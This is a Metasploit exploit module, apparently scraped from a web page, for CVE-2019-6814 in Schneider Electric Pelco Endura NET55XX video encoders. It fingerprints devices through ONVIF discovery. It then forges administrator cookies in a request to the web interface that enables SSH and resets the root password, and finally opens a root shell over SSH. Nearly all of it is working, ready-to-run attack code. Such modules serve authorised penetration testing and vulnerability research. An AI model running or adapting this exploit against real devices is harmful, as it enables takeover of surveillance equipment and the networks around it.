# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::SSH

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Schneider Electric Pelco Endura NET55XX Encoder",
      &#039;Description&#039;    => %q(
        This module exploits inadequate access controls within the webUI to enable
        the SSH service and change the root password. This module has been tested successfully
        on: NET5501, NET5501-I, NET5501-XT, NET5504, NET5500, NET5516, NET550 versions.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Lucas Dinucci <idntk.lucdin@gmail.com>&#039;,
          &#039;Vitor Esperan√ßa <vitor@machiaveliclabs.com>&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-6814&#039;],
          [&#039;URL&#039;, &#039;https://www.schneider-electric.com/en/download/document/SEVD-2019-134-01/&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039; => {
            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
            &#039;ConnectionType&#039; => &#039;find&#039;
          }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;     => [ [ "Universal", {} ] ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Jan 25 2019",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;NEW_PASSWORD&#039;, [ true, &#039;New password to be set for the root account&#039;, Rex::Text.rand_text_alphanumeric(16)]),
        OptInt.new(&#039;TIMEOUT&#039;, [ true, &#039;Timeout for the requests&#039;, 10])
      ]
    )

    register_advanced_options(
      [
        OptInt.new(&#039;UDP_PORT&#039;, [ true, &#039;UDP port for the ONVIF service&#039;, 3702]),
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )
  end

  def new_password
    datastore[&#039;NEW_PASSWORD&#039;]
  end

  def check
    xmlPayload = &#039;<?xml version="1.0" encoding="UTF-8"?>&#039;\
                 &#039;<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">&#039;\
                 &#039;<Header xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing">&#039;\
                 &#039;<a:Action mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</a:Action>&#039;\
                 &#039;<a:MessageID>uuid:f3d577a3-431f-4450-ab45-b480042b9c74</a:MessageID>&#039;\
                 &#039;<a:ReplyTo>&#039;\
                 &#039;<a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>&#039;\
                 &#039;</a:ReplyTo>&#039;\
                 &#039;<a:To mustUnderstand="1">urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To>&#039;\
                 &#039;</Header>&#039;\
                 &#039;<Body>&#039;\
                 &#039;<Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery">&#039;\
                 &#039;<Types xmlns:dp0="http://www.onvif.org/ver10/network/wsdl">dp0:NetworkVideoTransmitter</Types>&#039;\
                 &#039;</Probe>&#039;\
                 &#039;</Body>&#039;\
                 &#039;</Envelope><?xml version="1.0" encoding="UTF-8"?>&#039;

    connect_udp(true, {&#039;RPORT&#039; => datastore[&#039;UDP_PORT&#039;]})
    udp_sock.put(xmlPayload)
    resp = []
    resp << udp_sock.get(datastore[&#039;TIMEOUT&#039;])
    xmlResponse = resp.join(&#039;,&#039;)
    disconnect_udp
    if xmlResponse.include?("NET5501") || xmlResponse.include?("NET5501-I") || xmlResponse.include?("NET5501-XT") || xmlResponse.include?("NET5504") || xmlResponse.include?("NET5500") || xmlResponse.include?("NET5516") || xmlResponse.include?("NET5508")
      return Exploit::CheckCode::Appears
    end
     CheckCode::Safe
  end

  def change_password
    print_status("#{peer} - Attempt to change the root password...")
    post = {"enable": true, "passwd": new_password, "userid": "root"}.to_json

    login = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; =>  normalize_uri(target_uri.path, &#039;/cgi-bin/webra.fcgi?network/ssh&#039;),
      &#039;data&#039; => post,
      &#039;headers&#039; =>
      {
        &#039;Cookie&#039;        => &#039;live_onoff=0; userid=admin; grpid=ADMIN; permission=2147483647&#039;,
        &#039;Content-Type&#039;  => &#039;application/json;charset=utf-8&#039;
      }
    }, timeout=datastore[&#039;TIMEOUT&#039;])

    fail_with(Failure::UnexpectedReply, "Failed to change root password") unless login && login.code == 200
    print_good("#{rhost}:80 - Successfully changed the root password...")
    print_good("#{rhost}:80 - New credentials: User: root / Password: #{new_password}")
  end

  def do_login
    change_password
    print_status("#{rhost}:22 - Attempt to start a SSH connection...")
    factory = ssh_socket_factory
    opts = {
      :auth_methods    => [&#039;password&#039;, &#039;keyboard-interactive&#039;],
      :port            => 22,
      :use_agent       => false,
      :config          => true,
      :password        => new_password,
      :proxy           => factory,
      :non_interactive => true,
      :verify_host_key => :never
    }
    opts.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]
    begin
      ssh = nil
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        ssh = Net::SSH.start(datastore[&#039;RHOST&#039;], &#039;root&#039;, opts)
      end
    rescue Rex::ConnectionError
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:22 SSH - Disconnected during negotiation"
    rescue ::Timeout::Error
      print_error "#{rhost}:22 SSH - Timed out during negotiation"
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:22 SSH - Failed authentication"
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:22 SSH Error: #{e.class} : #{e.message}"
    end
    if ssh
      conn = Net::SSH::CommandStream.new(ssh)
      return conn
    end
  end

  def exploit
    conn = do_login
    if conn
      print_good("#{rhost}:22 - Session established ")
      handler(conn.lsock)
    end
  end
end

